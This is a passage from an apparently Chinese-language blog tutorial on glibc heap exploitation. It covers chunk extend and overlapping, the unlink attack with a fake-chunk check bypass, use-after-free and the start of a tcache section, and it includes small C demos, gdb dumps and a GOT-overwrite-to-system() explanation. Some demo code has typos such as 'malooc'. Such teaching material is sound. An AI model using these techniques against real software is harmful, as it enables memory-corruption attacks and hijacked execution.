class="hljs-number">00000000000</span><br><span class="hljs-number">0x804b168</span>:<span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x804b178</span>:<span class="hljs-number">0</span>x00000<span class="hljs-number">00000000411</span><span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br></code></pre></td></tr></table></figure><p>执行后就会发现它覆盖了下一个堆块的低字节（小端序）：</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">0x804b158</span>:<span class="hljs-number">0</span>x00000<span class="hljs-number">00000000021</span><span class="hljs-number">0</span>x4<span class="hljs-number">141414141414141</span><br><span class="hljs-number">0x804b168</span>:<span class="hljs-number">0</span>x4<span class="hljs-number">141414141414141</span><span class="hljs-number">0</span>x4<span class="hljs-number">141414141414141</span><br><span class="hljs-number">0x804b178</span>:<span class="hljs-number">0</span>x00000<span class="hljs-number">00000000400</span><span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br></code></pre></td></tr></table></figure><p>（为什么没有截图，因为这玩意我都复现不成功😅）</p><blockquote><p>这个漏洞在2.29之后就不能利用了，因为glibc更新以后增加了检查的代码。</p></blockquote><h1 id="Chunk-Extend-and-Overlapping"><a href="#Chunk-Extend-and-Overlapping" class="headerlink" title="Chunk Extend and Overlapping"></a>Chunk Extend and Overlapping</h1><p>这种攻击目的在于将一个chunk块的可控区域衍生到与其相邻的一个或者多个chunk块中。通过这种攻击方式，我们可以修改到不属于本chunk块的内容。通过 extend 可以实现 chunk overlapping 的效果。</p><p>一般来说这种技术并不能直接控制程序的执行流程，但是可以控制chunk 中的内容。如果chunk 中存在字符串指针、函数指针等，就可以利用这些指针来进一步进行信息泄露和程序执行流程。</p><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>chunk extend 技术能够产生的原因在于 ptmalloc 在对堆 chunk 进行操作时使用的各种宏。</p><ul><li><p>获取当前 chunk 块大小的操作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* 仅用户空间部分的大小 */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> chunksize(p) (chunksize_nomask(p) &amp; ~(SIZE_BITS))</span><br><span class="hljs-comment">//SIZE_BITS 在这里是一个代表堆块大小的标志位掩码</span><br><br><span class="hljs-comment">/* 完整堆块的大小 */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> chunksize_nomask(p) ((p)-&gt;mchunk_size)</span><br></code></pre></td></tr></table></figure></li><li><p>获取下一个 chunk 块地址的操作，即使用当前块指针加上当前块大小</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">define</span> next_chunk(p) ((mchunkptr)(((char *) (p)) + chunksize(p)))</span><br></code></pre></td></tr></table></figure></li><li><p>获取前一个 chunk 块信息的操作，其中堆块地址的计算是由当前 chunk 地址减去前一个 chunk 的大小</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* 前一个堆块的大小 */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> prev_size(p) ((p)-&gt;mchunk_prev_size)</span><br><br><span class="hljs-comment">/* 前一个堆块的地址  */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> prev_chunk(p) ((mchunkptr)(((char *) (p)) - prev_size(p)))</span><br></code></pre></td></tr></table></figure></li><li><p>判断当前堆块是否被使用，即查看下一 chunk 的 prev_inuse 域，而下一块地址又如我们前面所述是根据当前 chunk 的 size 计算得出的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> inuse(p)</span><br>    ((((mchunkptr)(((<span class="hljs-type">char</span> *) (p)) + chunksize(p)))-&gt;mchunk_size) &amp; PREV_INUSE)<br></code></pre></td></tr></table></figure></li></ul><p>通过上面的几个宏我们可以看出， ptmalloc 通过 chunk header 的数据来判断 chunk 的使用情况和对 chunk 前后进行定位。</p><p>而我们的 chunk extend 就是通过控制 chunk header 即 size 和 pre_size 域来实现跨越块操作导致 overlapping。</p><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><h5 id="🌰1：对-inuse-的-fastbin-进行-extend"><a href="#🌰1：对-inuse-的-fastbin-进行-extend" class="headerlink" title="🌰1：对 inuse 的 fastbin 进行 extend"></a>🌰1：对 inuse 的 fastbin 进行 extend</h5><p>就是通过更改第一个堆块的信息来控制它之后的堆块的内容</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">void</span> *ptr1,*ptr2,*ptr3;<br>    ptr1 = malooc(<span class="hljs-number">0x10</span>);<br>    ptr2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <br>    *(<span class="hljs-type">long</span> <span class="hljs-type">long</span> *)((<span class="hljs-type">long</span> <span class="hljs-type">long</span>)ptr1<span class="hljs-number">-0x8</span>)=<span class="hljs-number">0x41</span>;  <span class="hljs-comment">// 修改第一个块的size域</span><br>    <br>    <span class="hljs-built_in">free</span>(ptr1);<br>    pre3 = malooc(<span class="hljs-number">0x30</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <br>&#125;<br></code></pre></td></tr></table></figure><p>两次 malloc 后堆块中的数据是这样的</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/extend-gdb1.png"></p><p>修改了 ptr1 的 size 位后对应变成了 41</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/extend-gdb2.png"></p><p>我们 free 掉它之后， 也对应进入了 0x40 的 bin 中</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/extend-gdb3.png"></p><p>此时我们再次分配 0x30 的堆块就会把原本属于 ptr2 头部的内存分配到 ptr3 中，</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/extend-gdb4.png"></p><p>此时原本 chunk2 的头部是现在 ptr3 的用户内容，我们可以直接控制其内容，这种状态就叫做 overlapping chunk。</p><h5 id="🌰2：对-inuse-的-unsortedbin-进行-extend"><a href="#🌰2：对-inuse-的-unsortedbin-进行-extend" class="headerlink" title="🌰2：对 inuse 的 unsortedbin 进行 extend"></a>🌰2：对 inuse 的 unsortedbin 进行 extend</h5><p>我们知道处于 fastbin 范围的 chunk 释放后会被置入 fastbin 链表中，而不处于这个范围的 chunk 被释放后会被置于 unsorted bin 链表中。</p><p>接下来我们就使用 0x80 来分配堆。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">void</span> *ptr1,*ptr2,*ptr3;<br>    ptr1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>    ptr2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1</span>);      <span class="hljs-comment">//防止与top chunk合并</span><br>    <br>    *(<span class="hljs-type">int</span> *)((<span class="hljs-type">int</span>)ptr1<span class="hljs-number">-0x8</span>)=<span class="hljs-number">0xb1</span>;<br>    <span class="hljs-built_in">free</span>(ptr1);<br>    ptr3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0xa0</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>在这个例子中，因为分配的 size 不处于 fastbin 的范围，因此在释放时如果与 top chunk 相连会导致和 top chunk 合并。所以我们需要额外分配一个 chunk，把释放的块与 top chunk 隔开。</p></blockquote><p>三次 malloc 分配完以后，内存中的数据如下：</p><p><img src="D:/笔记/PWN/堆/精美配图/unsortedextend-gdb1.png"></p><p>修改size 数据后ptr1 和 ptr2 合并，如下：</p><p><img src="D:/笔记/PWN/堆/精美配图/unsortedextend-gdb2.png"></p><p>相应的 free 后进入了 unsorted bin</p><p><img src="D:/笔记/PWN/堆/精美配图/unsortedextend-gdb3.png"></p><p>再次分配我们就达到了overlapping chunk的目的。</p><h5 id="🌰3：对-free-的-unsortedbin-进行-extend"><a href="#🌰3：对-free-的-unsortedbin-进行-extend" class="headerlink" title="🌰3：对 free 的 unsortedbin 进行 extend"></a>🌰3：对 free 的 unsortedbin 进行 extend</h5><blockquote><p>在例二的基础上进行，先释放 chunk ，再修改</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">void</span> *ptr1,*ptr2,*ptr3;<br>    ptr1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>    ptr2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1</span>);      <span class="hljs-comment">//防止与top chunk合并</span><br>    <br>    <span class="hljs-built_in">free</span>(ptr1);<br>    *(<span class="hljs-type">int</span> *)((<span class="hljs-type">int</span>)ptr1<span class="hljs-number">-0x8</span>)=<span class="hljs-number">0xb1</span>;<br>    ptr3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0xa0</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>三次 malloc 之后的结果如下</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/freesortedextend-gdb1.png"></p><p>释放 ptr1 后，chunk 进入 unsortedbin</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/freesortedextend-gdb2.png"></p><p>修改 size 字段</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/freesortedextend-gdb3.png"></p><p>再次分配，ptr2 头部被分配进新的堆块，我们就这样控制了 ptr2 的内容</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/freesortedextend-gdb4.png"></p><h5 id="🌰4：通过-extend-向后-overlapping"><a href="#🌰4：通过-extend-向后-overlapping" class="headerlink" title="🌰4：通过 extend 向后 overlapping"></a>🌰4：通过 extend 向后 overlapping</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">void</span> *ptr1,*ptr2;<br><br>    ptr1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    ptr2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>); <br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>); <br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>); <br>    *(<span class="hljs-type">int</span> *)((<span class="hljs-type">int</span>)ptr<span class="hljs-number">-0x8</span>)=<span class="hljs-number">0x61</span>;<br>    <span class="hljs-built_in">free</span>(ptr1);<br>    <span class="hljs-built_in">free</span>(ptr2);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    ptr1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x50</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>在 malloc(0x50) 对 extend 区域重新占位后，其中 0x10 的 fastbin 块依然可以正常的分配和释放，此时已经构成 overlapping，通过对 overlapping 的进行操作可以实现 fastbin attack。</p><p>就像上面的例子，我们在两次free后可以发现bin 中出现了overlapping。</p><p>第一轮的 malloc 结束</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/extendlap-gdb1.png"></p><p>修改 ptr1 的 size</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/extendlap-gdb2.png"></p><p>两次 free，bin 中出现了overlapping。</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/extendlap-gdb3.png"></p><p>而接下来的两次 malloc ，“ 两块 ” chunk 也被一次分配了</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/extendlap-gdb4.png"></p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/extendlap-gdb5.png"></p><h5 id="🌰5：通过-extend-向前-overlapping"><a href="#🌰5：通过-extend-向前-overlapping" class="headerlink" title="🌰5：通过 extend 向前 overlapping"></a>🌰5：通过 extend 向前 overlapping</h5><p>前向 extend 利用了 smallbin 的 unlink 机制，通过修改 pre_size 域可以跨越多个 chunk 进行合并实现 overlapping。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">void</span> *ptr1,*ptr2,*ptr3,*ptr4;<br>    ptr1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">128</span>);      <span class="hljs-comment">//smallbin1</span><br>    ptr2=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);    <span class="hljs-comment">//fastbin1</span><br>    ptr3=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);    <span class="hljs-comment">//fastbin2</span><br>    ptr4=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">128</span>);     <span class="hljs-comment">//smallbin2</span><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);    <span class="hljs-comment">//防止与top合并</span><br>    <span class="hljs-built_in">free</span>(ptr1);<br>    *(<span class="hljs-type">int</span> *)((<span class="hljs-type">long</span> <span class="hljs-type">long</span>)ptr4<span class="hljs-number">-0x8</span>)=<span class="hljs-number">0x90</span>;  <span class="hljs-comment">//修改pre_inuse域</span><br>    *(<span class="hljs-type">int</span> *)((<span class="hljs-type">long</span> <span class="hljs-type">long</span>)ptr4<span class="hljs-number">-0x10</span>)=<span class="hljs-number">0xd0</span>;  <span class="hljs-comment">//修改pre_size域</span><br>    <span class="hljs-built_in">free</span>(ptr4);  <span class="hljs-comment">//unlink进行前向extend</span><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x150</span>);  <span class="hljs-comment">//占位块</span><br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>第一次free后的堆结构如下</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/extendlap2-gdb2.png"></p><p>对数据进行修改后 <code>free(ptr4)</code> 可以发现 chunk 被合并了</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/extendlap2-gdb3.png"></p><h1 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h1><p>unlink 机制的存在是为了防止内存过度碎片化。当一个 chunk 被释放时，该 chunk 非 fastbin 或 tcache bin ，libc 就会检查该堆块前后是否有 chunk 属于被释放的状态，如果存在，就会将他们从 bin 中取出进行合并，即使这些前后的堆块是在 fast bin 或者 tcache bin 中。</p><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>unlink 的过程就类似于把双向链表中间的空闲 chunk 取出来，具体流程如下：</p><p>最初 bin 中的堆块像最上图那样链接，P 是我们释放的堆块， BK 是 P 对应链表前方的堆块， FD 是后面的堆块。unlink 结束后就变成了最下图，此时p 在 FD 的 data 中，然后 BK 和 FD 直接相连。</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/unlink_intro.png"></p><p>我们先从已经被淘汰的防护时的 unlink 开始学习其原理</p><h5 id="被淘汰的-unlink"><a href="#被淘汰的-unlink" class="headerlink" title="被淘汰的 unlink"></a>被淘汰的 unlink</h5><p>我们假设堆内的结构如以下左图，现在有物理空间连续的两个 chunk（Q，Nextchunk），其中 Q 处于使用状态、Nextchunk 处于释放状态。</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/old_unlink_vul.png"></p><p>那么如果我们通过某种方式（比如溢出）将 Nextchunk 的 fd 和 bk 指针修改为指定的值。则当我们 free(Q) 时，会依次进行下面的操作：</p><ul><li>glibc 判断这个块属于 small chunk</li><li>判断是否需要向前合并，发现前一个 chunk 处于使用状态，不需要向前合并</li><li>判断是否需要向后合并，后一个 chunk 空闲，需要合并</li><li>进行 unlink 操作</li></ul><p> unlink 具体执行的效果如下：</p><ul><li><p><code>FD = P-&gt;fd = target addr - 12</code>  ，即将 <em>FD</em> 字段赋值为堆块 P 的 <em>fd</em> 字段所存储的数据 target addr - 12 </p></li><li><p><code>BK = P-&gt;bk = expect value</code> ，即将 <em>BK</em> 字段赋值为堆块 P 的 <em>bk</em> 字段所存储的数据 expect value （我们预期改写的数据）。</p></li><li><p><code>FD-&gt;bk = BK</code> ，即将 <em>target addr - 12 + 12</em> 处的内容（ target addr 本身）设置为 expect value。</p></li><li><p><code>BK-&gt;fd = FD</code>，即将 <em>expect value + 8</em> 处的内容设置为 target addr - 12。</p></li></ul><p>在这里我们需要确保 expect value + 8 处的地址具有可写的权限，否则可能无法成功利用该漏洞。</p><p>成功执行 unlink 漏洞利用后，会将目标地址处的值设置为我们预期的内容，从而实现任意地址写操作。</p><p>我们可以利用这个漏洞来将某个 GOT 表项指向系统函数或者我们想要调用的函数，从而劫持程序执行流程。但是需要注意的是，expect value + 8 处的值也会被破坏，可能会影响程序的正常执行，因此在利用漏洞时需要仔细考虑和处理这些影响。</p><h3 id="当前的-unlink"><a href="#当前的-unlink" class="headerlink" title="当前的 unlink"></a>当前的 unlink</h3><p>哈哈哈，怎么会这么简单呢🤪</p><p>现在的 unlink 实现之前会对 chunk 的 size 和双向链表进行检查 ，具体代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 检查 P 的大小是否与其相邻堆块的 prev_size 字段一致（size检查）</span><br><span class="hljs-keyword">if</span> (__builtin_expect(chunksize(P) != prev_size(next_chunk(P)), <span class="hljs-number">0</span>)) <br>&#123;<br>    malloc_printerr(<span class="hljs-string">&quot;corrupted size vs. prev_size&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">// 检查 P 的 fd 和 bk 指针是否与其前后双向链表节点的指针一致（双向链表完整性检查）</span><br><span class="hljs-keyword">if</span> (__builtin_expect(FD-&gt;bk != P || BK-&gt;fd != P, <span class="hljs-number">0</span>)) <br>&#123;<br>    malloc_printerr(check_action, <span class="hljs-string">&quot;corrupted double-linked list&quot;</span>, P, AV);<br>&#125;<br><br><span class="hljs-comment">// 在 largebin 中，检查 P 的 next_size 指针是否与其前后双向链表节点的指针一致（双向链表完整性检查）</span><br><span class="hljs-keyword">if</span> (__builtin_expect(P-&gt;fd_nextsize-&gt;bk_nextsize != P || P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="hljs-number">0</span>)) <br>&#123;<br>    malloc_printerr(check_action, <span class="hljs-string">&quot;corrupted double-linked list (not small)&quot;</span>, P, AV);<br>&#125;<br></code></pre></td></tr></table></figure><p>其中就有对 fd 和 bk 的检查。而上面的情况中，就会被检查出来，我们无法使用这种方法。</p><p>但是我们可以伪造堆块来绕过检查😎，我们有一个公式：</p><ol><li>P -&gt; fd -&gt; bk &#x3D;&#x3D; P &lt;&#x3D;&gt; *( P -&gt; fd + 0x18 ) &#x3D;&#x3D; P</li><li>p -&gt; bk -&gt; fd &#x3D;&#x3D; P &lt;&#x3D;&gt; *( p -&gt; bk + 0x10 ) &#x3D;&#x3D; P</li></ol><p>简单点说就是：</p><ol><li><strong>P -&gt; fd &#x3D; &amp; P - 0x18</strong></li><li><strong>P -&gt; bk &#x3D; &amp; P - 0x10</strong></li></ol><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/unlink.png"></p><p>触发unlink后P处的指针会变为 P-0x18 。</p><p>如果将上面说的P变为我们想要修改的地址比如保存指针的数组地址，利用上面说到的 unlink 就能控制数组中的指针，并且我们使指针保存类似 free_got、puts_got 等，之后我们修改指针使其为 system_got ，那么下次我们调用其他函数就会调用 system（）。</p><h1 id="Use-After-Free"><a href="#Use-After-Free" class="headerlink" title="Use After Free"></a>Use After Free</h1><p>Use After Free 就是内存块被释放以后再次被利用，有以下几种情况：</p><ul><li>内存块被释放后，其对应的指针被设置为 NULL，再次利用时程序就会崩溃</li><li>内存块被释放后，其对应的指针没有被设置为 NULL ，而且然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么程序可以正常运转。</li><li>内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，就很有可能会出现问题。</li></ul><p>我们一般所指的 Use After Free 漏洞主要是后两种。此外，我们一般称被释放后没有被设置为 NULL 的内存指针为 dangling pointer （它的中文翻译叫迷途指针😊）。</p><p>它的实际应用就是我们在像是 chunk extend 里面用到的示例2</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">void</span> *ptr1,*ptr2,*ptr3;<br>    ptr1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>    ptr2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1</span>);      <span class="hljs-comment">//防止与top chunk合并</span><br>    <br>    <span class="hljs-built_in">free</span>(ptr1);<br>    *(<span class="hljs-type">int</span> *)((<span class="hljs-type">int</span>)ptr1<span class="hljs-number">-0x8</span>)=<span class="hljs-number">0xb1</span>;  <span class="hljs-comment">// Use After Free</span><br>    ptr3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0xa0</span>);  <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="Tcache-attack"><a href="#Tcache-attack" class="headerlink" title="Tcache attack"></a>Tcache attack</h1><blockquote><p>这一部分我的环境是Ubuntu18 libc2.27</p></blockquote><h3 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h3><p>Tcache 全名为 Thread Local Caching，在 libc2.26 之后才出现。它为每个线程创建一个缓存，里面包含了一些小堆块。</p><p>Tcache bin 是单链表的数据结构，存储相同大小的空闲堆块，size大小范围是 0x20-0x410，允许存放的 chunk 数为7。当你使用 <code>free()</code> 函数释放一个堆块时，glibc 会将该堆块放入适当大小类别的 Tcache bin 中，以备后续再次分配。Tcache bin 采用先进后出的策略，且 prev_inuse 位不会被合并，也就是说 tcache bin 中的 chunk 不会被合并。</p><h3 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h3><p>在有了 tcache 机制以后，无论是分配还是释放堆块，tcache 都是首先被利用的，直到达到每一中 bin 的上限 7 为止。还有一种情况就是 fast bin 或者 small bin 返回了一个堆块，且 tcache 对应大小的 bin 中未满的话，那么该fast bin 或者 samll bin 链中的堆块会被加入到对应 tcache bin 中直至其上限。</p><h4 id="绕过-Tcache"><a href="#绕过-Tcache" class="headerlink" title="绕过 Tcache"></a>绕过 Tcache</h4><p>Tcache 机制无非就是增加了一层缓存，绕过 Tcache 就是我们手动构造填充堆块填满某一个大小对应的 thcache bin 链表，使得在再次回收的 bin 进入unsorted bin 或者 small bin，large bin 等等，再利用这些 bin 得到 libc 基址。</p><p>原理大致如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span 